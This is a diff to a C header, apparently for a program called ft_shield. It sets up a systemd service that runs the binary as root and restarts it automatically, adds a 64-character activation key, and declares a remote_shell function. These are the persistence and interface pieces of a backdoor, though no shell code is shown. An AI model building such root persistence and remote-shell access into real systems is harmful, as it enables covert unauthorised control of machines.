@@ -3,6 +3,8 @@
 
 #include <stdio.h>
 
+#define ACTIVATION_KEY_LEN 64
+
 #define SYSTEMD_CONFIG_PATH "/etc/systemd/system/ft_shield.service"
 
 #define SYSTEMD_CONFIG                                                                                                                                         \
@@ -16,11 +18,13 @@
     "Restart=always\n"                                                                                                                                         \
     "RestartSec=1\n"                                                                                                                                           \
     "User=root\n"                                                                                                                                              \
-    "ExecStart=/bin/ft_shield\n\n"                                                                                                                             \
+    "ExecStart=/bin/ft_shield %s\n\n"                                                                                                                             \
                                                                                                                                                                \
     "[Install]\n"                                                                                                                                              \
     "WantedBy=multi-user.target\n"
 
 size_t __log(FILE *restrict __stream, const char *restrict __format, ...);
+
+int remote_shell(char **env);
 
 #endif
